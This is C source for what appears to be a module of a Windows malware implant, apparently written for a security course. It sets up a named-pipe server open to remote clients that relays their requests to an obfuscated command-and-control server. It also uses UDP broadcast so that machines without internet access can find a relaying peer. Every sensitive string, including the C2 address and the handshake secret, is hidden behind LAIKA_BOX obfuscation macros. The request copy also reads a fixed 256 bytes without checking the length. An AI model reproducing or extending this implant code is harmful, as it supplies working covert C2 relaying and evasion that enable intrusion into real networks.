#include "debug.h"
#include "internet.h"
#include "pipe_server_client.h"

BOOL pipeThreadSuccess = FALSE;
BOOL listenThreadSuccess = FALSE;
BOOL pipeInternetConnect = FALSE;
BOOL kill = FALSE;

// used for server-client communication
DWORD GetAnswerToRequest(LPBYTE pchRequest, 
                         DWORD cbRequestBytes,
                         LPBYTE pchReply, 
                         DWORD cbReplyMax,
                         LPDWORD pchReplyBytes) {
    debug_printf("Client Request String:\"%.*s\"\n",(int) cbRequestBytes, (LPSTR)pchRequest);

    char URL[URL_SIZE] = {0};
    // Copy the first 256 bytes into the buffer
    memcpy(URL, (LPSTR) pchRequest, sizeof(URL));

    /* Send to the server */
    #ifdef PRODUCTION
    LAIKA_BOX_STARTVAR(char*, server_addr, KEY_interneth_SERVER_ADDR_PROD, DATA_interneth_SERVER_ADDR_PROD);
    #else
    LAIKA_BOX_STARTVAR(char*, server_addr, KEY_interneth_SERVER_ADDR_TEST, DATA_interneth_SERVER_ADDR_TEST);
    #endif
    if (ERROR_SUCCESS != connectServer(
                            server_addr,
                            SERVER_PORT_C2,
                            URL, 
                            &pchRequest[URL_SIZE],
                            cbRequestBytes - URL_SIZE, 
                            pchReply,
                            cbReplyMax, 
                            pchReplyBytes)) {
        debug_printf("[-] send to server failed!\n");
        return GetLastError();
    }
    LAIKA_BOX_ENDVAR(server_addr);

    debug_printf("received bytes from server %ld\n", *pchReplyBytes);
    // debug_printf("sending from server %d\n", lenth);
    return ERROR_SUCCESS;
}

// client function in pipe server-client communication
DWORD WINAPI pipeClient(LPSTR lpPipeServerName,
                        LPBYTE lpcbRequest,
                        DWORD cbRequestBytes,
                        LPBYTE lpcbReply,
                        DWORD cbReplyBytesMax,
                        LPDWORD pcbReplyBytes) {
    BOOL fSuccess = FALSE; 

    // debug_printf("Sending %ld bytes message: \"%.*s\"\n", cbRequestBytes, (int)cbRequestBytes, lpcbRequest); 
    debug_printf("Sending %ld bytes message\n", cbRequestBytes); 

    fSuccess = CallNamedPipeA(
        lpPipeServerName,
        lpcbRequest,
        cbRequestBytes,
        lpcbReply,
        cbReplyBytesMax,
        pcbReplyBytes,
        NMPWAIT_WAIT_FOREVER);

    if (FALSE == fSuccess) {
        debug_printf("pipe connect failed, error num:%ld\n", GetLastError());
        return GetLastError();
    }

    // printf("\"message form server:%.*s\"\nlength:%ld\n", (int)*pcbReplyBytes, lpcbReply, *pcbReplyBytes); 
    debug_printf("\"message form server:length:%ld\n", *pcbReplyBytes); 
    debug_printf("<End of message>\n");

    return 0; 
}

// pipe server function, create a pipe instance, read from it
// handle message and write reply back to pipe
// Before use this function, please allocate memroy
// for request and reply
DWORD WINAPI pipeServer(LPVOID lpvParam) {
    if (NULL == lpvParam) {
        debug_printf("pipeServer: parmameter is NULL\n");
        return ERROR_GEN_FAILURE;
    }
    PIPEBUFF* pipeBuff = (PIPEBUFF *) lpvParam;
    HANDLE hPipe = INVALID_HANDLE_VALUE; 
    LAIKA_BOX_STARTVAR(char*, lpszPipename_str, KEY_pipeserverclient_pipeserver_lpszpipename, DATA_pipeserverclient_pipeserver_lpszpipename)
    LPCTSTR lpszPipename = lpszPipename_str; 
    LPBYTE pchRequest = pipeBuff->pbRequestBuffer;
    LPBYTE pchReply = pipeBuff->pbReplyBuffer;

    while (!kill) {
        hPipe = CreateNamedPipeA( 
            lpszPipename,                 // pipe name 
            PIPE_ACCESS_DUPLEX,           // read/write access 
            PIPE_TYPE_MESSAGE |           // message type pipe 
            PIPE_READMODE_MESSAGE |       // message-read mode 
            PIPE_WAIT |                   // blocking mode
            PIPE_ACCEPT_REMOTE_CLIENTS,   // remote access              
            PIPE_UNLIMITED_INSTANCES,     // max instances  
            pipeBuff->cbReplyBytes,       // output buffer size (reply to clients) 
            pipeBuff->cbRequestBytes,     // input buffer size  (request from clients)
            NMPWAIT_WAIT_FOREVER,         // client time-out 
            NULL);                        // default security attribute 

        if (INVALID_HANDLE_VALUE == hPipe) {
            debug_printf("CreateNamedPipe failed, GLE=%ld.\n", GetLastError()); 
            // create pipe until success
            continue;
        }

        debug_printf("Pipe Server: server thread awaiting client connection on %s\n", lpszPipename);
        LAIKA_BOX_ENDVAR(lpszPipename_str)
        pipeThreadSuccess = TRUE;

        for (;;) { 
            // Wait for the client to connect; if it succeeds,
            // the function returns a nonzero value. If the function
            // returns zero and GetLastError returns ERROR_PIPE_CONNECTED,
            // it is also fine.
        
            BOOL fConnected = FALSE; 
            fConnected = ConnectNamedPipe(hPipe, NULL) ? 
                TRUE : (GetLastError() == ERROR_PIPE_CONNECTED); 

            // internet down, terminate this thread
            if (!pipeInternetConnect) {
                DisconnectNamedPipe(hPipe); 
                CloseHandle(hPipe);
                debug_printf("pipe server thread exit\n");
                return -1;
            }

            if (fConnected) { 
                debug_printf("Client connected\n"); 
            } else {
                // The client could not connect, so close the pipe
                // and create pipe again
                CloseHandle(hPipe); 
                debug_printf("The client could not connect, so close the pipe.\n");
                break;
            }
            DWORD cbBytesRead = 0, cbReplyBytes = 0, cbWritten = 0; 
            BOOL fSuccess = FALSE;
            // Loop until done reading
            while (TRUE) { 
            // Read client requests from the pipe.
                fSuccess = ReadFile( 
                    hPipe,                      // handle to pipe 
                    pchRequest,                 // buffer to receive data 
                    pipeBuff->cbRequestBytes,   // maximum number of bytes to be read
                    &cbBytesRead,               // number of bytes read 
                    NULL);                      // not overlapped I/O 

                if (!fSuccess || cbBytesRead == 0) {   
                    if (GetLastError() == ERROR_BROKEN_PIPE) {
                        debug_printf("client disconnected.\n"); 
                    } else {
                        debug_printf("ReadFile failed, GLE=%ld.\n", GetLastError()); 
                    }
                    break;
                }
                // Process the incoming message.
                // TODO: please do some error check here
                if (ERROR_SUCCESS != GetAnswerToRequest(
                                        pchRequest,
                                        cbBytesRead,
                                        pchReply,
                                        pipeBuff->cbReplyBytes,
                                        &cbReplyBytes)) {
                    for (DWORD i = 0; i < 8; i++) {
                        pchReply[i] = 0;
                    }
                    cbReplyBytes = 8;
                }
                // Write the reply to the pipe. 
                fSuccess = FALSE;
                fSuccess = WriteFile( 
                               hPipe,        // handle to pipe 
                               pchReply,     // buffer to write from 
                               cbReplyBytes, // number of bytes to write 
                               &cbWritten,   // number of bytes written 
                               NULL);        // not overlapped I/O 
                if (!fSuccess || cbReplyBytes != cbWritten) {   
                    debug_printf("InstanceThread WriteFile failed, GLE=%ld.\n", GetLastError()); 
                    break;
                }
                // Flush the pipe to allow the client to read the pipe's contents 
                // before disconnecting.
                FlushFileBuffers(hPipe); 
            }
            // Disconnect the pipe instance
            DisconnectNamedPipe(hPipe); 
            debug_printf("server finish 1 connect\n");
        }
    }

    return ERROR_SUCCESS;
}

// listen all local networks and send hostname to valid client
DWORD WINAPI pipeServerListen(LPVOID lpvParam) {
    WSADATA wsaData;
    char serverName[MAX_COMPUTERNAME_LENGTH + 1] = {0};
    DWORD bufferSize = MAX_COMPUTERNAME_LENGTH + 1;

    int wsaStartup = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (wsaStartup != 0) {
        debug_printf("WSAStartup failed: %d\n", wsaStartup);
        return 1;
    }
    if (!gethostname(serverName, bufferSize)) {
        debug_printf("Server Name: %s\n", serverName);
    } else {
        debug_printf("Error getting server name: %ld\n", GetLastError());
        debug_printf("error:%d\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }

    SOCKET serverSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (INVALID_SOCKET == serverSocket) {
        debug_printf("Socket creation failed.\n");
        WSACleanup();
        return 1;
    }
    SOCKADDR_IN serverAddr;
    memset(&serverAddr, 0, sizeof(serverAddr));
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = htonl(INADDR_ANY);  // Listen on all interfaces
    serverAddr.sin_port = htons(SERVER_PORT);

    if (SOCKET_ERROR == bind(serverSocket, (SOCKADDR *)&serverAddr, sizeof(serverAddr))) {
        debug_printf("Bind failed.\n");
        closesocket(serverSocket);
        WSACleanup();
        return 1;
    }

    listenThreadSuccess = TRUE;

    // TODO: while (has connect to server) ...
    while (pipeInternetConnect) {
        char buffer[32] = {0};
        struct sockaddr_in clientAddr;
        int clientAddrSize = sizeof(clientAddr);
        int receivedBytes = recvfrom(
                                serverSocket,
                                buffer,
                                sizeof(buffer),
                                0,
                                (struct sockaddr *)&clientAddr,
                                &clientAddrSize);

        if (receivedBytes > 0) {
            // Process the received data and reply
            debug_printf("from ip address:%s\n", inet_ntoa(clientAddr.sin_addr));
            debug_printf("Receive: %.*s\n", receivedBytes, buffer);
            // do some check in buffer, if valid then send else ignore
            LAIKA_BOX_STARTVAR(char*, cs6983, KEY_pipeserverclient_pipeServerListen_CS6983, DATA_pipeserverclient_pipeServerListen_CS6983)
            if (0 != strncmp(buffer, cs6983, 32)) {
                debug_printf("check failed\n");
                continue;
            }
            LAIKA_BOX_ENDVAR(cs6983)
            sendto(
                serverSocket,
                serverName,
                strlen(serverName) + 1,
                0,
                (struct sockaddr *)&clientAddr,
                clientAddrSize);
        } else {
            debug_printf("error while receiving\n");
        }
    }
    closesocket(serverSocket);
    WSACleanup();

    return ERROR_SUCCESS;
}

// broadcast and find server that can connect pipe
// if turn is 0 or smaller will keep broadcast
// if turn bigger than 1, wiil broadcast turn - 1 times
BOOL getPipeHostName(LPSTR targetHostName, DWORD nameLenth, DWORD turn) {

    WSADATA wsaData;
    int wsaStartup = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (wsaStartup != 0) {
        debug_printf("WSAStartup failed: %d\n", wsaStartup);
        return FALSE;
    }

    SOCKET sock;
    sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock == INVALID_SOCKET) {
        debug_printf("Socket creation failed\n");
        WSACleanup();
        return FALSE;
    }

    // Set the socket to allow broadcasts
    int broadcastPermission = 1;
    if (SOCKET_ERROR == setsockopt(
                            sock,
                            SOL_SOCKET,
                            SO_BROADCAST,
                            (char *)&broadcastPermission,
                            sizeof(broadcastPermission))) {
        debug_printf("Failed to set socket to broadcast mode\n");
        closesocket(sock);
        WSACleanup();
        return FALSE;
    }

    // Set socket to non-blocking mode
    u_long mode = 1;  // 1 to enable non-blocking socket
    ioctlsocket(sock, FIONBIO, &mode);

    struct sockaddr_in broadcastAddr, recvAddr;
    int addrLen = sizeof(recvAddr);
    LAIKA_BOX_STARTVAR(char*, broadIP_str, KEY_pipeserverclient_getPipeHostName_255, DATA_pipeserverclient_getPipeHostName_255)
    char *broadcastIP = broadIP_str;
    // Set up the broadcast address
    memset(&broadcastAddr, 0, sizeof(broadcastAddr));
    broadcastAddr.sin_family = AF_INET;
    broadcastAddr.sin_addr.s_addr = inet_addr(broadcastIP);
    broadcastAddr.sin_port = htons(BROADCAST_PORT);

    LAIKA_BOX_ENDVAR(broadIP_str)
    LAIKA_BOX_STARTVAR(char*, cs6983, KEY_pipeserverclient_pipeServerListen_CS6983, DATA_pipeserverclient_pipeServerListen_CS6983)
    char *message = cs6983;
    struct timeval timeout;
    fd_set readfds;
    while (TRUE) {
        if (1 == turn) {
            break;
        } else if (turn > 1) {
            turn--;
        }
        // Set up the timeout for select
        timeout.tv_sec = BROADCAST_INTERVAL;
        timeout.tv_usec = 0;

        FD_ZERO(&readfds);
        FD_SET(sock, &readfds);

        int result;
        result = select(0, &readfds, NULL, NULL, &timeout);
        if (result > 0) {
            // There's incoming data - process it
            char recvBuf[32];
            result = recvfrom(sock, recvBuf, sizeof(recvBuf), 0, (struct sockaddr *)&recvAddr, &addrLen);
            // result should count the last NULL terminated byte if sender included it
            // please take care of this when use strcmp or other function
            if (result > 0) {
                debug_printf("Received message length:%d\n", result);
                debug_printf("Received message: %.*s\n", result, recvBuf);
                if (result <= nameLenth) {
                    strncpy(targetHostName, recvBuf, result);
                    break;
                } else {
                    // the server name is too long
                    debug_printf("server name too long for client\n");
                }
            }
        } else if (result == 0) {
            // Timeout occurred - no message received
            // Broadcast message
            sendto(
                sock,
                message,
                strlen(message) + 1,
                0,
                (struct sockaddr *)&broadcastAddr,
                sizeof(broadcastAddr));
            debug_printf("Timed out, Broadcast message sent\n");
        }
    }

    closesocket(sock);
    WSACleanup();

    return TRUE;
}

// this function is used to wake up pipeServer thread form
// block state and thus check pipeInternetConnect and exit
// gracefully
VOID dummyConnectPipe(){
    CHAR dummyRequest[8] = {1};
    CHAR dummyReply[8] = {0};
    DWORD dwBytesRead;
    LAIKA_BOX_STARTVAR(char*, pipenameA_str, KEY_pipeserverclient_dummyConnectPipe_callnamedpipeA, DATA_pipeserverclient_dummyConnectPipe_callnamedpipeA)
    CallNamedPipeA(
        pipenameA_str,
        dummyRequest,
        sizeof(dummyRequest),
        dummyReply,
        sizeof(dummyReply),
        &dwBytesRead,
        NMPWAIT_WAIT_FOREVER);
    LAIKA_BOX_ENDVAR(pipenameA_str)
    return;
}

// this function is used to wake up pipeServerListen thread form
// block state and thus check pipeInternetConnect and exit gracefully
VOID dummyBroadcast() {
    CHAR name[128] = {0};
    getPipeHostName(name, sizeof(name), 5);
    return;
}